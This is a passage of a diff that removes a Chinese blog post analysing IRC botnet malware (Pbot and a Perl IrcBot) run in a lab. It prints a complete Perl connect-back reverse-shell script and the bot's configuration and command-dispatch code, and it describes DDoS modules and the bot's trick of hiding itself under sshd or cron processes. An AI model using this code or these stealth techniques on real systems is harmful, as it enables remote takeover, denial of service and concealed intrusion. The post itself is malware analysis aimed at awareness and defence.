-&lt;p&gt;随后便进入&lt;code&gt;uname&lt;/code&gt;分支调用&lt;code&gt;php_uname()&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;h4 id=&#34;exec-cmd&#34;&gt;exec&amp;amp;cmd&lt;/h4&gt;
-
-&lt;p&gt;执行命令部分有两块可以实现，分别是exec和cmd&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528255190724.png&#34; alt=&#34;1528255190724&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;其中exec直接调用php内置的exec命令，cmd则是通过自定义方法&lt;code&gt;Exe()&lt;/code&gt;执行，在&lt;code&gt;Exe()&lt;/code&gt;方法内部对系统支持的命令执行函数进行了判断，可以通过以下几种方法使命令得到最终执行&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528255437456.png&#34; alt=&#34;1528255437456&#34; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&#34;pscan&#34;&gt;pscan&lt;/h4&gt;
-
-&lt;p&gt;可以探测指定ip的端口是否开放&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;.pscan ip port&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528271275578.png&#34; alt=&#34;1528271275578&#34; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&#34;conback&#34;&gt;conback&lt;/h4&gt;
-
-&lt;p&gt;&lt;code&gt;conback &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528270109767.png&#34; alt=&#34;1528270109767&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;该指令会在尝试在&lt;code&gt;/tmp/&lt;/code&gt;和&lt;code&gt;/var/tmp&lt;/code&gt;写入脚本，脚本使用perl语言编写并经过base64编码，执行后会向指定ip反弹一个shell，在连接断开后脚本自动删除。脚本内容如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/perl
-use Socket;
-print &amp;quot;Data Cha0s Connect Back Backdoor\n\n&amp;quot;;
-if (!$ARGV[0]) {
-  printf &amp;quot;Usage: $0 [Host] &amp;lt;Port&amp;gt;\n&amp;quot;;
-  exit(1);
-}
-print &amp;quot;[*] Dumping Arguments\n&amp;quot;;
-$host = $ARGV[0];
-$port = 80;
-if ($ARGV[1]) {
-  $port = $ARGV[1];
-}
-print &amp;quot;[*] Connecting...\n&amp;quot;;
-$proto = getprotobyname(&#39;tcp&#39;) || die(&amp;quot;Unknown Protocol\n&amp;quot;);
-socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die (&amp;quot;Socket Error\n&amp;quot;);
-my $target = inet_aton($host);
-if (!connect(SERVER, pack &amp;quot;SnA4x8&amp;quot;, 2, $port, $target)) {
-  die(&amp;quot;Unable to Connect\n&amp;quot;);
-}
-print &amp;quot;[*] Spawning Shell\n&amp;quot;;
-if (!fork( )) {
-  open(STDIN,&amp;quot;&amp;gt;&amp;amp;SERVER&amp;quot;);
-  open(STDOUT,&amp;quot;&amp;gt;&amp;amp;SERVER&amp;quot;);
-  open(STDERR,&amp;quot;&amp;gt;&amp;amp;SERVER&amp;quot;);
-  exec {&#39;/bin/sh&#39;} &#39;-bash&#39; . &amp;quot;\0&amp;quot; x 4;
-  exit(0);
-}
-print &amp;quot;[*] Datached\n\n&amp;quot;;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;测试了几个功能都是可以正常使用的，如下图&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528269072874.png&#34; alt=&#34;1528269072874&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;在数据包中也能清楚地看到交互过程&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528270676034.png&#34; alt=&#34;1528270676034&#34; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;0x03-ddos-perl-ircbot&#34;&gt;0x03 DDoS Perl IrcBot&lt;/h2&gt;
-
-&lt;p&gt;基于Perl编写的IrcBot功能大致与Pbot相同，不过实现方式有些不一样&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528274109719.png&#34; alt=&#34;1528274109719&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;从bot的帮助信息来看是支持不少指令的，主要分为以下几个功能模块&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;!u @system 	# 系统模块
-!u @version	# 版本信息
-!u @channel	# IRC频道操作模块
-!u @flood  	# DDoS模块
-!u @utils  	# 其它功能模块
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;连接配置-1&#34;&gt;连接配置&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;$server = &#39;192.168.3.195&#39; unless $server;	# 服务器ip，如果$server不存在则默认
-my $port = &#39;6667&#39;;	# 端口
-
-my $linas_max=&#39;8&#39;;
-my $sleep=&#39;5&#39;;
-
-my $homedir = &amp;quot;/tmp&amp;quot;;	#工作目录
-my $version = &#39;gztest v1&#39;; 
-
-my @admins = (&amp;quot;test&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;root1&amp;quot;,&amp;quot;root2&amp;quot;,&amp;quot;root3&amp;quot;,&amp;quot;root4&amp;quot;); # 管理员
-my @hostauth = (&amp;quot;192.168.3.193&amp;quot;); 	# 管理员ip
-my @channels = (&amp;quot;#Perl&amp;quot;); 	# IRC频道
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;同样的，我们在&lt;code&gt;192.168.3.195&lt;/code&gt;IRC服务器上创建一个&lt;code&gt;#Perl&lt;/code&gt;频道，运行后能看到bot上线&lt;/p&gt;
-
-&lt;h3 id=&#34;功能分析-1&#34;&gt;功能分析&lt;/h3&gt;
-
-&lt;h4 id=&#34;数据包&#34;&gt;数据包&lt;/h4&gt;
-
-&lt;p&gt;抓取数据包看一下IrcBot与IRC服务器之间的通信&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528274862059.png&#34; alt=&#34;1528274862059&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;发送消息部分是和Pbot是一样的，Pbot是通过起始符(&lt;code&gt;.&lt;/code&gt;)来提取具体指令，而在Perl IrcBot内部则是通过正则表达式来完成，即&lt;code&gt;parse&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528275278915.png&#34; alt=&#34;1528275278915&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;随后根据具体指令执行相应的功能&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;if (grep {$_ =~ /^\Q$hostmask\E$/i} @hostauth) {
-    if (grep {$_ =~ /^\Q$pn\E$/i} @admins) {	# 判断当前ip和用户是否是管理员
-        if ($onde eq &amp;quot;$meunick&amp;quot;) {
-            shell(&amp;quot;$pn&amp;quot;, &amp;quot;$args&amp;quot;);
-        }
-        if ($args =~ /^(\Q$meunick\E|\!u)\s+(.*)/) {
-            my $natrix = $1;
-            my $arg = $2;
-            if ($arg =~ /^\!(.*)/) {			# 三种方法来执行功能
-                ircase(&amp;quot;$pn&amp;quot;, &amp;quot;$onde&amp;quot;, &amp;quot;$1&amp;quot;);
-            }
-            elsif ($arg =~ /^\@(.*)/) {
-                $ondep = $onde;
-                $ondep = $pn if $onde eq $meunick;
-                bfunc(&amp;quot;$ondep&amp;quot;, &amp;quot;$1&amp;quot;);			# help/irc/ddos/shell等功能
-            }
-            else {
-                shell(&amp;quot;$onde&amp;quot;, &amp;quot;$arg&amp;quot;);
-            }
-        }
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;bfunc&lt;/code&gt;方法作为最主要的模块，包含了4部分功能&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;帮助信息&lt;/strong&gt;  显示脚本帮助信息；&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;IRC频道操作&lt;/strong&gt;  包括加入退出频道，更改昵称，邀请朋友等；&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;DDoS模块&lt;/strong&gt;  包括TCP Flood、UDP Flood、HTTP DDoS等功能；&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;渗透辅助功能&lt;/strong&gt;   包括执行命令、反弹shell、端口扫描、文件下载等功能；&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;其中&lt;code&gt;ircase&lt;/code&gt;是相应的在IRC频道中的操作&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528276673338.png&#34; alt=&#34;1528276673338&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;用图形来表示bot的主要功能如下图所示&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528281340573.png&#34; alt=&#34;1528281340573&#34; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&#34;行为特征&#34;&gt;行为特征&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528277061564.png&#34; alt=&#34;1528277061564&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;在bot启动的时候，不会以自身的进程启动，而是在&lt;code&gt;sshd&lt;/code&gt;，&lt;code&gt;apache&lt;/code&gt;等进程中随机fork一个启动，fork失败则退出脚本，这样子非常隐蔽地隐藏了自身进程，随后在加入IRC频道的过程中也会随机选择一个IRC版本号加入。&lt;/p&gt;
-
-&lt;p&gt;在运行Perl IrcBot后，脚本选择以&lt;code&gt;/usr/sbin/cron&lt;/code&gt;的进程启动，而且可以明显看到CPU占用达到100%，脚本潜伏在正常进程中很难被发现。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1528274476743.png&#34; alt=&#34;1528274476743&#34; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h2&gt;
-
-&lt;p&gt;这两款IRC bot在互联网上已经存在很久了，最近被广泛利用的Drupal RCE漏洞和Weblogic XMLDecoder反序列化漏洞使此类基于IRC协议的恶意脚本重新流行起来，根据在线文件分享平台&lt;a href=&#34;https://pastebin.com/search?q=ircbot&#34;&gt;pastebin&lt;/a&gt;查询相关脚本也不在少数，而且存在多种语言版本的IRC bot，黑客直接通过各种远程漏洞植入样本，接受C&amp;amp;C控制，具有很大的危害性。&lt;/p&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
